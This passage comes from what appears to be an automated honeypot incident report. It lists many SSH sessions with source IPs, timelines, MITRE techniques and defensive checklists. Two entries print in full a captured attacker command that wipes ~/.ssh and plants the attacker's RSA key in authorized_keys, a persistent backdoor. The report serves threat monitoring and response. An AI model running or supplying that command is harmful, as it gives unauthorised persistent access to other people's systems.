| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:14:00` | `cowrie.session.connect` |
| `2026-07-20 22:14:00` | `cowrie.client.version` |
| `2026-07-20 22:14:00` | `cowrie.client.kex` |
| `2026-07-20 22:14:01` | `cowrie.login.success` |
| `2026-07-20 22:14:02` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af1e4094006

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-07-20 22:17 |
| **Last Seen** | 2026-07-20 22:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:17:09` | `cowrie.session.connect` |
| `2026-07-20 22:17:09` | `cowrie.client.version` |
| `2026-07-20 22:17:09` | `cowrie.client.kex` |
| `2026-07-20 22:17:11` | `cowrie.login.success` |
| `2026-07-20 22:17:11` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26d0a4a5dde

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]46` |
| **First Seen** | 2026-07-20 22:17 |
| **Last Seen** | 2026-07-20 22:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:17:17` | `cowrie.session.connect` |
| `2026-07-20 22:17:17` | `cowrie.client.version` |
| `2026-07-20 22:17:17` | `cowrie.client.kex` |
| `2026-07-20 22:17:18` | `cowrie.login.success` |
| `2026-07-20 22:17:18` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]46` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d61ed663eb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 22:17 |
| **Last Seen** | 2026-07-20 22:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:17:19` | `cowrie.session.connect` |
| `2026-07-20 22:17:19` | `cowrie.client.version` |
| `2026-07-20 22:17:19` | `cowrie.client.kex` |
| `2026-07-20 22:17:19` | `cowrie.login.success` |
| `2026-07-20 22:17:20` | `cowrie.session.params` |
| `2026-07-20 22:17:20` | `cowrie.command.input` |
| `2026-07-20 22:17:20` | `cowrie.log.closed` |
| `2026-07-20 22:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab9028d4d976

| Field | Detail |
|---|---|
| **Source IP** | `130.185.96[.]113` |
| **First Seen** | 2026-07-20 22:20 |
| **Last Seen** | 2026-07-20 22:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:20:05` | `cowrie.session.connect` |
| `2026-07-20 22:20:05` | `cowrie.client.version` |
| `2026-07-20 22:20:05` | `cowrie.client.kex` |
| `2026-07-20 22:20:06` | `cowrie.login.success` |
| `2026-07-20 22:20:07` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.185.96[.]113` to AbuseIPDB if not already reported
- [ ] Block `130.185.96[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effbaffd54d7

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-07-20 22:20 |
| **Last Seen** | 2026-07-20 22:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:20:11` | `cowrie.session.connect` |
| `2026-07-20 22:20:12` | `cowrie.client.version` |
| `2026-07-20 22:20:12` | `cowrie.client.kex` |
| `2026-07-20 22:20:12` | `cowrie.login.success` |
| `2026-07-20 22:20:12` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ebbfb50ab16

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 22:24 |
| **Last Seen** | 2026-07-20 22:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:24:51` | `cowrie.session.connect` |
| `2026-07-20 22:24:51` | `cowrie.client.version` |
| `2026-07-20 22:24:51` | `cowrie.client.kex` |
| `2026-07-20 22:24:51` | `cowrie.login.success` |
| `2026-07-20 22:24:52` | `cowrie.session.params` |
| `2026-07-20 22:24:52` | `cowrie.command.input` |
| `2026-07-20 22:24:52` | `cowrie.log.closed` |
| `2026-07-20 22:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2c0ef5fdf2

| Field | Detail |
|---|---|
| **Source IP** | `185.100.84[.]174` |
| **First Seen** | 2026-07-20 22:28 |
| **Last Seen** | 2026-07-20 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:28:31` | `cowrie.session.connect` |
| `2026-07-20 22:28:31` | `cowrie.client.version` |
| `2026-07-20 22:28:31` | `cowrie.client.kex` |
| `2026-07-20 22:28:31` | `cowrie.login.success` |
| `2026-07-20 22:28:32` | `cowrie.session.params` |
| `2026-07-20 22:28:32` | `cowrie.command.input` |
| `2026-07-20 22:28:32` | `cowrie.log.closed` |
| `2026-07-20 22:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.100.84[.]174` to AbuseIPDB if not already reported
- [ ] Block `185.100.84[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d06c724edc

| Field | Detail |
|---|---|
| **Source IP** | `147.45.48[.]17` |
| **First Seen** | 2026-07-20 22:29 |
| **Last Seen** | 2026-07-20 22:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:29:26` | `cowrie.session.connect` |
| `2026-07-20 22:29:26` | `cowrie.client.version` |
| `2026-07-20 22:29:26` | `cowrie.client.kex` |
| `2026-07-20 22:29:27` | `cowrie.login.success` |
| `2026-07-20 22:29:28` | `cowrie.session.params` |
| `2026-07-20 22:29:28` | `cowrie.command.input` |
| `2026-07-20 22:29:28` | `cowrie.command.failed` |
| `2026-07-20 22:29:28` | `cowrie.log.closed` |
| `2026-07-20 22:29:29` | `cowrie.session.params` |
| `2026-07-20 22:29:29` | `cowrie.command.input` |
| `2026-07-20 22:29:29` | `cowrie.session.file_download` |
| `2026-07-20 22:29:29` | `cowrie.log.closed` |
| `2026-07-20 22:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `147.45.48[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f0ae8539ea

| Field | Detail |
|---|---|
| **Source IP** | `147.45.48[.]17` |
| **First Seen** | 2026-07-20 22:29 |
| **Last Seen** | 2026-07-20 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:29:29` | `cowrie.session.connect` |
| `2026-07-20 22:29:29` | `cowrie.client.version` |
| `2026-07-20 22:29:29` | `cowrie.client.kex` |
| `2026-07-20 22:29:30` | `cowrie.login.success` |
| `2026-07-20 22:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `147.45.48[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da836bf89b2b

| Field | Detail |
|---|---|
| **Source IP** | `147.45.48[.]17` |
| **First Seen** | 2026-07-20 22:29 |
| **Last Seen** | 2026-07-20 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:29:30` | `cowrie.session.connect` |
| `2026-07-20 22:29:30` | `cowrie.client.version` |
| `2026-07-20 22:29:31` | `cowrie.client.kex` |
| `2026-07-20 22:29:31` | `cowrie.login.success` |
| `2026-07-20 22:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `147.45.48[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1162215b1a4c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-20 22:30 |
| **Last Seen** | 2026-07-20 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:30:41` | `cowrie.session.connect` |
| `2026-07-20 22:30:41` | `cowrie.client.version` |
| `2026-07-20 22:30:41` | `cowrie.client.kex` |
| `2026-07-20 22:30:42` | `cowrie.login.success` |
| `2026-07-20 22:30:42` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:30:42` | `cowrie.direct-tcpip.data` |
| `2026-07-20 22:30:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b4207924ec9

| Field | Detail |
|---|---|
| **Source IP** | `218.13.214[.]18` |
| **First Seen** | 2026-07-20 22:31 |
| **Last Seen** | 2026-07-20 22:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:31:18` | `cowrie.session.connect` |
| `2026-07-20 22:31:18` | `cowrie.client.version` |
| `2026-07-20 22:31:18` | `cowrie.client.kex` |
| `2026-07-20 22:31:20` | `cowrie.login.success` |
| `2026-07-20 22:31:21` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.13.214[.]18` to AbuseIPDB if not already reported
- [ ] Block `218.13.214[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e57b3fef704

| Field | Detail |
|---|---|
| **Source IP** | `171.8.42[.]112` |
| **First Seen** | 2026-07-20 22:33 |
| **Last Seen** | 2026-07-20 22:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:33:53` | `cowrie.session.connect` |
| `2026-07-20 22:33:53` | `cowrie.client.version` |
| `2026-07-20 22:33:53` | `cowrie.client.kex` |
| `2026-07-20 22:33:55` | `cowrie.login.success` |
| `2026-07-20 22:33:56` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.42[.]112` to AbuseIPDB if not already reported
- [ ] Block `171.8.42[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-805d9f1df5a8

| Field | Detail |
|---|---|
| **Source IP** | `58.245.210[.]70` |
| **First Seen** | 2026-07-20 22:34 |
| **Last Seen** | 2026-07-20 22:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:34:02` | `cowrie.session.connect` |
| `2026-07-20 22:34:02` | `cowrie.client.version` |
| `2026-07-20 22:34:02` | `cowrie.client.kex` |
| `2026-07-20 22:34:04` | `cowrie.login.success` |
| `2026-07-20 22:34:05` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.245.210[.]70` to AbuseIPDB if not already reported
- [ ] Block `58.245.210[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb42efbff10

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]140` |
| **First Seen** | 2026-07-20 22:37 |
| **Last Seen** | 2026-07-20 22:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:37:02` | `cowrie.session.connect` |
| `2026-07-20 22:37:02` | `cowrie.client.version` |
| `2026-07-20 22:37:02` | `cowrie.client.kex` |
| `2026-07-20 22:37:04` | `cowrie.login.success` |
| `2026-07-20 22:37:05` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c805da0eb569

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-07-20 22:37 |
| **Last Seen** | 2026-07-20 22:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:37:11` | `cowrie.session.connect` |
| `2026-07-20 22:37:12` | `cowrie.client.version` |
| `2026-07-20 22:37:12` | `cowrie.client.kex` |
| `2026-07-20 22:37:15` | `cowrie.login.success` |
| `2026-07-20 22:37:16` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3eb9ad804f

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-07-20 22:38 |
| **Last Seen** | 2026-07-20 22:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:38:18` | `cowrie.session.connect` |
| `2026-07-20 22:38:19` | `cowrie.client.version` |
| `2026-07-20 22:38:19` | `cowrie.client.kex` |
| `2026-07-20 22:38:21` | `cowrie.login.success` |
| `2026-07-20 22:38:22` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d230203ac9c

| Field | Detail |
|---|---|
| **Source IP** | `197.156.97[.]198` |
| **First Seen** | 2026-07-20 22:38 |
| **Last Seen** | 2026-07-20 22:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:38:27` | `cowrie.session.connect` |
| `2026-07-20 22:38:27` | `cowrie.client.version` |
| `2026-07-20 22:38:27` | `cowrie.client.kex` |
| `2026-07-20 22:38:28` | `cowrie.login.success` |
| `2026-07-20 22:38:29` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.97[.]198` to AbuseIPDB if not already reported
- [ ] Block `197.156.97[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b346fc2e975f

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-07-20 22:41 |
| **Last Seen** | 2026-07-20 22:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:41:13` | `cowrie.session.connect` |
| `2026-07-20 22:41:13` | `cowrie.client.version` |
| `2026-07-20 22:41:13` | `cowrie.client.kex` |
| `2026-07-20 22:41:15` | `cowrie.login.success` |
| `2026-07-20 22:41:16` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e24845cf6c9

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-07-20 22:41 |
| **Last Seen** | 2026-07-20 22:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:41:47` | `cowrie.session.connect` |
| `2026-07-20 22:41:47` | `cowrie.client.version` |
| `2026-07-20 22:41:47` | `cowrie.client.kex` |
| `2026-07-20 22:41:48` | `cowrie.login.success` |
| `2026-07-20 22:41:49` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e178a51ae09

| Field | Detail |
|---|---|
| **Source IP** | `139.59.36[.]109` |
| **First Seen** | 2026-07-20 22:43 |
| **Last Seen** | 2026-07-20 22:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:43:03` | `cowrie.session.connect` |
| `2026-07-20 22:43:03` | `cowrie.client.version` |
| `2026-07-20 22:43:04` | `cowrie.client.kex` |
| `2026-07-20 22:43:05` | `cowrie.login.success` |
| `2026-07-20 22:43:06` | `cowrie.session.params` |
| `2026-07-20 22:43:06` | `cowrie.command.input` |
| `2026-07-20 22:43:06` | `cowrie.command.failed` |
| `2026-07-20 22:43:06` | `cowrie.log.closed` |
| `2026-07-20 22:43:07` | `cowrie.session.params` |
| `2026-07-20 22:43:07` | `cowrie.command.input` |
| `2026-07-20 22:43:07` | `cowrie.session.file_download` |
| `2026-07-20 22:43:07` | `cowrie.log.closed` |
| `2026-07-20 22:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `139.59.36[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a801be0f2fc

| Field | Detail |
|---|---|
| **Source IP** | `139.59.36[.]109` |
| **First Seen** | 2026-07-20 22:43 |
| **Last Seen** | 2026-07-20 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:43:07` | `cowrie.session.connect` |
| `2026-07-20 22:43:07` | `cowrie.client.version` |
| `2026-07-20 22:43:08` | `cowrie.client.kex` |
| `2026-07-20 22:43:09` | `cowrie.login.success` |
| `2026-07-20 22:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `139.59.36[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f29d57d2e3

| Field | Detail |
|---|---|
| **Source IP** | `139.59.36[.]109` |
| **First Seen** | 2026-07-20 22:43 |
| **Last Seen** | 2026-07-20 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:43:09` | `cowrie.session.connect` |
| `2026-07-20 22:43:09` | `cowrie.client.version` |
| `2026-07-20 22:43:09` | `cowrie.client.kex` |
| `2026-07-20 22:43:10` | `cowrie.login.success` |
| `2026-07-20 22:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `139.59.36[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa33a877edf

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-07-20 22:44 |
| **Last Seen** | 2026-07-20 22:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
